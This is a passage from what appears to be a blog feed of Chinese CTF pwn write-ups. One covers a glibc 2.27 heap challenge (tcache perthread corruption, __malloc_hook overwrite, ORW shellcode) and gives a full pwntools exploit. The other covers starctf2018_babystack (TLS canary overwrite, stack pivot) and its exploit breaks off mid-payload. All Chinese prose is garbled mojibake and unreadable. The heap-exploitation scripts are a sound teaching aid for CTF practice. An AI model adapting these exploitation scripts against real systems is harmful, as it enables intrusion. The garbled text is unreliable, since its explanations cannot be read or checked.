¹æ®addå‡½æ•°è¿™è¾¹çš„é™åˆ¶ï¼Œæ‰€ä»¥addå‡½æ•°åªèƒ½æ‰§è¡Œ8æ¬¡ã€‚</p><p><img src="/../img/2706180-20220828154036282-188410497.png"></p><h3 id="editå‡½æ•°ï¼š"><a href="#editå‡½æ•°ï¼š" class="headerlink" title="editå‡½æ•°ï¼š"></a>editå‡½æ•°ï¼š</h3><p>å› ä¸ºeditå‡½æ•°ä¸­çš„readæ˜¯æ ¹æ®å­˜å‚¨åœ¨bssæ®µä¸Šçš„sizeæ¥å†³å®šè¾“å…¥çš„å­—èŠ‚æ•°çš„ã€‚è€Œdeleteå‡½æ•°åä¼šå°†sizeç½®ç©ºï¼Œè¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ã€‚</p><p><img src="/../img/2706180-20220828154050622-1112821718.png"></p><h3 id="showå‡½æ•°ï¼š"><a href="#showå‡½æ•°ï¼š" class="headerlink" title="showå‡½æ•°ï¼š"></a>showå‡½æ•°ï¼š</h3><p>è¿™å°±æ˜¯ä¸ªå¸¸è§„çš„showå‡½æ•°ï¼Œæ‰“å°å †å—é‡Œçš„æ•°æ®ã€‚</p><p><img src="/../img/2706180-20220828154116200-1979509908.png"></p><h3 id="initå‡½æ•°ï¼š"><a href="#initå‡½æ•°ï¼š" class="headerlink" title="initå‡½æ•°ï¼š"></a>initå‡½æ•°ï¼š</h3><p>åˆå§‹åŒ–å‡½æ•°ä¸­ä¸ä»…å¼€äº†æ²™ç®±ï¼Œè¿˜æ˜ å°„åˆ°0x66660000äº†ä¸€æ®µå¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ã€‚</p><p><img src="/../img/2706180-20220828154127411-1367182171.png"></p><h2 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h2><h3 id="æ³„éœ²å †åœ°å€ï¼Œåšä¸€ä¸ªtcache-dup"><a href="#æ³„éœ²å †åœ°å€ï¼Œåšä¸€ä¸ªtcache-dup" class="headerlink" title="æ³„éœ²å †åœ°å€ï¼Œåšä¸€ä¸ªtcache dup"></a>æ³„éœ²å †åœ°å€ï¼Œåšä¸€ä¸ªtcache dup</h3><p>å› ä¸ºæ˜¯2.27çš„libcï¼Œå­˜åœ¨UAFæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ‰“tcache dupã€‚å› ä¸ºæ²™ç®±ç¦ç”¨äº†execveï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨orwï¼Œå°†orwçš„shellcodeå†™åœ¨0x66660000ï¼Œæœ€åå°†0x66660000è¿™ä¸ªåœ°å€å†™åˆ°malloc_hookå³å¯ã€‚</p><p>è¿™é¢˜çš„é—®é¢˜å°±æ˜¯è™½ç„¶å­˜åœ¨showå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬addå‡½æ•°æ‰§è¡Œçš„æ¬¡æ•°æœ‰é™ï¼ŒåŒæ—¶æ— æ³•ç”³è¯·å¤§äº0x100çš„å †å—ã€‚å› æ­¤æ­£å¸¸æƒ…å†µä¸‹æˆ‘ä»¬çš„å †å—è¢«é‡Šæ”¾åè¿›ä¸å»unsorted binä¸­ï¼Œä¹Ÿå°±æ˜¯æ‹¿ä¸åˆ°libcåœ°å€(ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ‹¿åˆ°å †åœ°å€)ã€‚è€Œä¸”deleteå‡½æ•°çš„æ¬¡æ•°æœ‰é™ï¼Œæˆ‘ä»¬ä¸èƒ½æ— é™åˆ¶çš„åˆ©ç”¨tcache dupã€‚</p><p>å› æ­¤è¿™é“é¢˜é‡‡ç”¨çš„æ”»å‡»æ‰‹æ³•ä¸ºtcache perthread corruption</p><p>é¦–å…ˆæˆ‘ä»¬å…ˆåˆ©ç”¨UAFé…åˆshowå‡½æ•°æ³„éœ²ä¸‹å †åœ°å€ï¼Œæ¥ç€åšä¸€ä¸ªtcache dupã€‚æ­¤æ—¶çš„æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="/../img/2706180-20220828154144232-1994127415.png"></p><p>æ­¤æ—¶çš„expä¸ºï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h3><p>ç”±äºæˆ‘ä»¬æœ‰äº†å †åœ°å€ï¼Œé‚£æˆ‘ä»¬å°±æ‰“ä¸€ä¸ªtcache poisoningå°†tcache_perthread_structsheç”³è¯·å‡ºæ¥ï¼Œç„¶åæˆ‘ä»¬æ¥å°†0x66660000è¿™ä¸ªåœ°å€ä¼ªé€ ä¸ºä¸€ä¸ªtcacheçš„é“¾è¡¨å¤´ï¼ˆé¡ºä¾¿ä¿®æ”¹ä¸‹å¯¹åº”countï¼‰ï¼Œè¿™æ ·mallocå¯¹åº”çš„å­—èŠ‚å°±èƒ½æŠŠ0x66660000è¿™ä¸ªåœ°å€ç»™ç”³è¯·å‡ºæ¥äº†ï¼Œé¡ºä¾¿å†å°†æœ‰double freeçš„é‚£æ¡tcacheé“¾çš„countæ”¹æˆ7ï¼Œè¿™æ ·å†deleteä¸€æ¬¡ï¼Œå †å—å°±å¯ä»¥è¿›å…¥unsorted binä¸­äº†ã€‚</p><p>è¿™æ­¥çš„expå¦‚ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(target_addr))</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x251</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0700000000000001</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x66660000</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(heap_addr))</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶çš„binsæƒ…å†µå¦‚ä¸‹å›¾ï¼š</p><p><img src="/../img/2706180-20220828154202844-733207592.png"></p><h3 id="æ³„éœ²libcåœ°å€"><a href="#æ³„éœ²libcåœ°å€" class="headerlink" title="æ³„éœ²libcåœ°å€"></a>æ³„éœ²libcåœ°å€</h3><p>æ¥ç€æˆ‘ä»¬å°†0x66660000ç»™ç”³è¯·å‡ºæ¥å†™å…¥orwçš„shellcodeã€‚å†é‡Šæ”¾æ‰ä¸€æ¬¡ä½äºcountsä¸º7é‚£æ¡tcacheé“¾çš„å †å—(åœ¨è¿™ä¹‹å‰å…ˆç”³è¯·ä¸€ä¸ªå°å †å—ï¼Œæ¥é˜²æ­¢è¯¥å †å—é‡Šæ”¾åä¸top chunkåˆå¹¶)ï¼Œè¿™æ ·è¯¥å †å—å°±è¿›å…¥äº†unsorted binä¸­ã€‚ç„¶åæ‰§è¡Œshowå‡½æ•°ï¼Œæˆ‘ä»¬å°±æ‹¿åˆ°äº†libcåœ°å€ã€‚</p><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="/../img/2706180-20220828154218617-1109639937.png"></p><p>è¿™éƒ¨åˆ†çš„expä¸ºï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">4</span>,shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>))</span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#prevent chunk</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebca0</span></span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="tcache-perthread-corruptionï¼ŒåŠ«æŒmalloc-hook"><a href="#tcache-perthread-corruptionï¼ŒåŠ«æŒmalloc-hook" class="headerlink" title="tcache perthread corruptionï¼ŒåŠ«æŒmalloc_hook"></a>tcache perthread corruptionï¼ŒåŠ«æŒmalloc_hook</h3><p>æ­¤æ—¶æˆ‘ä»¬æ‹¿åˆ°äº†libcåœ°å€ï¼Œå¦‚æœå¸¸è§„æ–¹æ³•æ‰“tcache poisoningçš„è¯ï¼Œå…ˆeditä¿®æ”¹ä¸‹tcachebinä¸­çš„fdæŒ‡é’ˆï¼Œç„¶åéœ€è¦addä¸¤æ¬¡æ‰èƒ½å°†malloc_hookç”³è¯·å‡ºæ¥ï¼Œç„¶åä¿®æ”¹äº†malloc_hookåï¼Œè¿˜éœ€è¦æœ€åå†addä¸€æ¬¡æ‰èƒ½è§¦å‘shellcodeï¼Œä½†äº‹å®ä¸Šè¿™é“é¢˜æˆ‘ä»¬åªèƒ½æ‰§è¡Œaddå‡½æ•°8æ¬¡ï¼Œè€Œä¸Šè¿°æ‰€æœ‰æ“ä½œç”¨åˆ°äº†9æ¬¡addå‡½æ•°ï¼Œå› æ­¤è¿™ä¸ªæ–¹æ³•ä¸è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨çš„ç­–ç•¥æ˜¯å†ç¼–è¾‘ä¸€æ¬¡tcache_perthread_structç»“æ„ä½“ï¼Œç›´æ¥ä¼ªé€ å‡ºmalloc_hookçš„åœ°å€åœ¨tcache binä¸­ï¼Œå› ä¸ºmalloc_hookè¢«ä¼ªé€ åˆ°äº†é“¾è¡¨å¤´çš„ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¸€æ¬¡addå‡½æ•°å°±èƒ½å°†å…¶ç”³è¯·å‡ºæ¥äº†ï¼Œæœ€åç¼–è¾‘malloc_hookå†™å…¥0x66660000è¿™ä¸ªåœ°å€ï¼Œæˆ‘ä»¬å†æ¬¡æ‰§è¡Œaddå‡½æ•°æ—¶ï¼Œå°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„shellcodeå°†flagè¯»å‡ºæ¥äº†ã€‚</p><p>ä¸‹å›¾æ˜¯å°†malloc_hookå†™åˆ°tcacheé“¾è¡¨å¤´çš„ä½ç½®ã€‚</p><p><img src="/../img/2706180-20220828154235337-35519013.png"></p><p>è¿™éƒ¨åˆ†expä¸ºï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x251</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0700000000000001</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(malloc_hook))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a,d_s,d_e,<span class="number">0xf44</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x66660000</span>))</span><br><span class="line">add(<span class="number">0x40</span>)</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆçš„expå¦‚ä¸‹ï¼š</p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27132</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x11b7</span></span><br><span class="line">d_a=<span class="number">0x1193</span></span><br><span class="line">d_e=<span class="number">0x11ab</span></span><br><span class="line">d_s=<span class="number">0x119f</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))    </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">target_addr=heap_addr-<span class="number">0x260</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(target_addr))</span><br><span class="line"><span class="comment"># edit(1,p64(0x66660000))</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">  </span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x251</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0700000000000001</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x66660000</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">4</span>,shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#prevent chunk</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebca0</span></span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x251</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0700000000000001</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(malloc_hook))</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_s,d_e,0xf44)</span></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x66660000</span>))</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220828154253204-1927856405.png"></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>starctf2018_babystack</title>
      <link href="/posts/6967ee12.html"/>
      <url>/posts/6967ee12.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é€šè¿‡æœ¬é¢˜çš„å­¦ä¹ ä¸æ€»ç»“æœ‰ï¼š</p><ol><li><p>ä¹‹å‰ä¸€ç›´ä»¥ä¸ºret2libcå¿…é¡»å¾—è¿”å›åˆ°åŸæœ¬çš„è¾“å…¥å‡½æ•°å¤„ï¼Œå†æ¬¡è¾“å…¥ä¸€æ¬¡getshellã€‚ä½†æœ‰æ—¶å€™æˆ‘ä»¬é‡æ–°è¿”å›åˆ°åŸæœ¬çš„è¾“å…¥å‡½æ•°å¯èƒ½ä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ‰“ä¸€ä¸ªæ ˆè¿ç§»+ropæ‰§è¡Œreadã€‚å°±æ˜¯å…ˆè¦†ç›–rbpä¸ºbssæ®µä¸Šçš„åœ°å€ï¼Œç„¶åæ‰§è¡Œputså‡½æ•°æ³„éœ²libcï¼Œæ¥ç€æ‰§è¡Œreadå‡½æ•°å¾€bssæ®µä¸Šè¾“å…¥æ•°æ®ï¼Œæœ€åæ‰§è¡Œleave retå®Œæˆæ ˆè¿ç§»ä»è€Œå°†æ‰§è¡ŒæµåŠ«æŒåˆ°bssæ®µä¸Š</p></li><li><p>æ’å…¥åˆ°æ ˆé‡Œçš„canaryæ˜¯ä»TLSç»“æ„ä½“ä¸­çš„stack_guardæˆå‘˜å˜é‡èµ‹å€¼è¿‡æ¥çš„(è€Œå‡½æ•°è¿”å›æ—¶ï¼Œä¼šå°†æ ˆé‡Œçš„canaryä¸TLSä¸­çš„stack_guardåšå¯¹æ¯”)ã€‚ä¸»çº¿ç¨‹ä¸­çš„TLSé€šå¸¸ä½äºmmapæ˜ å°„å‡ºæ¥çš„åœ°å€ç©ºé—´é‡Œï¼Œè€Œä½ç½®ä¹Ÿæ¯”è¾ƒéšæœºï¼Œè¦†ç›–çš„å¯èƒ½æ€§ä¸å¤§ï¼›å­çº¿ç¨‹ä¸­çš„TLSåˆ™ä½äºçº¿ç¨‹æ ˆçš„é¡¶éƒ¨(é«˜åœ°å€å¤„)ï¼Œè€Œè¿™ä¸ªå­çº¿ç¨‹æ ˆé€šå¸¸ä¹Ÿæ˜¯mmapæ˜ å°„å‡ºæ¥çš„ä¸€æ®µå†…å­˜ï¼Œè¿™å°±ç»™äº†æˆ‘ä»¬æ ˆæº¢å‡ºæ§åˆ¶å­çº¿ç¨‹ä¸­çš„TLSæœºä¼š</p></li><li><p>TLS(Thread Local Storage) çº¿ç¨‹å±€éƒ¨å­˜å‚¨ã€‚æœ¬èº«æ˜¯ä¸€ç§æœºåˆ¶ï¼Œç®€å•æ¥è¯´å°±æ˜¯å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªå…¨å±€å˜é‡æˆ–è€…é™æ€å˜é‡å¯èƒ½ä¼šå‘ç”Ÿå†²çªï¼Œè€Œè¿™ä¸ªæœºåˆ¶ç±»ä¼¼äºè®©æ¯ä¸ªçº¿ç¨‹éƒ½å¤‡ä»½äº†ä¸€ä»½å…¨å±€å˜é‡æˆ–è€…é™æ€å˜é‡ï¼Œå½“å‰çº¿ç¨‹åªèƒ½ä¿®æ”¹è‡ªå·±è¿™ä»½å…¨å±€å˜é‡æˆ–è€…é™æ€å˜é‡å¹¶ä¸ä¼šå½±å“å…¶ä»–çº¿ç¨‹çš„å…¨å±€å˜é‡ä»¥åŠé™æ€å˜é‡ã€‚</p></li><li><p>åœ¨glibcå®ç°ä¸­ï¼ŒTLSè¢«æŒ‡å‘ä¸€ä¸ªsegment register fs(x86-64ä¸Š)ï¼Œå®ƒçš„ç»“æ„tcbhead_tå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">               thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>è€Œä¸Šé¢çš„stack_guardä¹Ÿå°±æ˜¯æ”¾åˆ°æ ˆé‡Œçš„canaryï¼Œè€Œåœ¨ç¨‹åºé‡Œçœ‹è§çš„è¿™è¡Œä»£ç </p><p><code>xor rdx, fs:28h</code>ä¸­çš„fså¯„å­˜å™¨ä¹Ÿå°±æŒ‡å‘äº†TLSè¿™ä¸ªç»“æ„ä½“ï¼Œè€Œåç§»0x28çš„ä½ç½®æ­£å¥½æ˜¯stack_guard,canaryæ˜¯æ¥è‡ªäºå†…æ ¸ç”Ÿæˆçš„ä¸€ä¸ªéšæœºæ•°ã€‚</p></li><li><p>æœ€åè¦è¯´ä¸€ä¸‹è¿™ä¸ªå­çº¿ç¨‹æ ˆå’Œçˆ¶çº¿ç¨‹å†…å­˜çš„å…³ç³»ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½ä¼šæœ‰è‡ªå·±å•ç‹¬çš„æ ˆåŒºï¼Œè€Œå­çº¿ç¨‹çš„æ ˆåŒºé€šå¸¸éƒ½æ˜¯è°ƒç”¨äº†mmapæ˜ å°„äº†ä¸€æ®µå†…å­˜ã€‚åœ¨çˆ¶è¿›ç¨‹é‡Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥çœ‹åˆ°è¿™ç‰‡å†…å­˜ï¼Œå¦‚ä¸‹</p></li></ol><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272219862.png" alt="image-20221127221900131"></p><p>åœ¨çˆ¶çº¿ç¨‹ä¸­ä¾ç„¶å¯ä»¥çœ‹åˆ°è¿™ç‰‡å†…å­˜ï¼Œå¹¶ä¸”å‘ç°æ˜¯mmapæ˜ å°„å‡ºæ¥çš„åŒºåŸŸï¼Œå¦‚ä¸‹ï¼Œæ‰€ä»¥å­çº¿ç¨‹çš„æ ˆåŒºåªæ˜¯å¯¹äºè‡ªå·±æ˜¯ç§æœ‰çš„ï¼Œè¿™å¹¶ä¸æ„å‘³ç€å…¶ä»–çº¿ç¨‹è®¿é—®ä¸äº†ï¼Œå¦‚æœèƒ½æ‹¿åˆ°ç›¸å…³æŒ‡é’ˆï¼Œä¾ç„¶å¯ä»¥å¯¹å…¶æ“ä½œã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272220056.png" alt="image-20221127222016217"></p><h2 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272224223.png" alt="image-20221127222402146"></p><h2 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h2><p>ä¸»å‡½æ•°å°±æ˜¯å¼€äº†ä¸€ä¸ªå­çº¿ç¨‹å‡ºæ¥ï¼Œç„¶åå­çº¿ç¨‹å»æ‰§è¡Œäº†è¿™ä¸ªå‡½æ•°</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272227552.png" alt="image-20221127222751474" style="zoom:50%;" /><p>è€Œåœ¨å­çº¿ç¨‹è°ƒç”¨çš„è¿™ä¸ªå‡½æ•°ï¼Œæ¼æ´æ˜¯å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡º(å¦‚ä¸‹)ã€‚ç‰¹ç‚¹æ˜¯æº¢å‡ºçš„å­—èŠ‚æ•°å¾ˆå¤§ã€‚</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272228512.png" alt="image-20221127222845444" style="zoom:50%;" /><h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><p>æœ¬ç¨‹åºæ˜¯åœ¨å­çº¿ç¨‹é‡Œæœ‰ä¸€ä¸ªå¾ˆå¤§çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œè€Œå­çº¿ç¨‹çš„æ ˆæ˜¯mmapæ˜ å°„å‡ºæ¥çš„å†…å­˜ï¼Œå¹¶ä¸”TLSä½äºæ ˆçš„é¡¶éƒ¨(é«˜åœ°å€)ï¼Œè¿™é“é¢˜çš„å…³é”®å°±æ˜¯ç»•è¿‡canaryä¿æŠ¤ã€‚å› ä¸ºæœ€åcanaryä¼šå’Œfs:0x28çš„å€¼å»æ¯”è¾ƒï¼Œè€Œfså°±æ˜¯TLSçš„é¦–åœ°å€ï¼Œ0x28çš„ä½ç½®å°±æ˜¯stack_guard(canaryå°±æ˜¯æ‹·è´çš„è¿™ä¸ªå€¼æ”¾åˆ°çš„æ ˆé‡Œ)ã€‚å› æ­¤æˆ‘ä»¬åœ¨å­çº¿ç¨‹é‡Œæ ˆæº¢å‡ºå»æ§åˆ¶TLSé‡Œçš„stack_guardï¼Œè®©å…¶å’Œcanaryçš„å€¼ä¸€æ ·å³å¯ã€‚</p><p><strong>å¦‚æœæƒ³è¦åœ¨gdbä¸­è·å–å­çº¿ç¨‹TLSçš„é¦–åœ°å€å¯ä»¥æ‰§è¡Œ<code>x/x pthread_self()</code>æ¥æŸ¥çœ‹</strong>ã€‚</p><p>å‰©ä¸‹çš„æ€è·¯å°±æ˜¯å…ˆæ§åˆ¶rbpä¸ºbssæ®µåœ°å€ï¼Œæ¥ç€æ‰§è¡Œputså‡½æ•°æ³„éœ²libcåœ°å€ï¼Œå†æ§åˆ¶æ‰§è¡Œæµè°ƒç”¨readå‡½æ•°ï¼Œå°†one_gadgetè¯»å…¥åˆ°bssæ®µ(å› ä¸ºæ‰§è¡Œsystemå‡½æ•°ä¼šå‡ºç°ä¸€äº›é”™è¯¯),æœ€åæ‰§è¡Œleave;retå°†æ ˆè¿ç§»åˆ°bssæ®µï¼ŒåŠ«æŒæ‰§è¡Œæµåˆ°åˆšæ‰è¯»å…¥çš„one_gadgetä¸Šã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:29028&quot;</span>,<span class="string">&quot;buu64-libc-2.27.so&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000400c03</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000400c01</span></span><br><span class="line">leave_ret=<span class="number">0x0000000000400955</span></span><br><span class="line">debug(p,<span class="number">0x400A7D</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;How many bytes do you want to send?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x1850</span>))</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1008</span>+p64(<span class="number">0xdeadbeef</span>)<span class="comment">#0xdeadbeef is canary</span></span><br><span class="line">payload+=p64(<span 